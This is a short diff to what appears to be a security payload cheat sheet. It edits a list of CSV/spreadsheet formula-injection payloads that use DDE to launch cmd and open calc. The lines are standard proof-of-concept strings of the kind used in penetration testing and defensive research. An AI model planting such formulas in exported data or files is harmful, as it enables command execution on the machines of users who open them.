@@ -3,7 +3,7 @@
 ### Payloads
 
 ```
--1+1+cmd|' /C calc'!A0
+=1+1+cmd|' /C calc'!A0
 -2+3+cmd|' /C calc'!A0
 +2+3+cmd|' /C calc'!A0
 @2+3+cmd|' /C calc'!A0
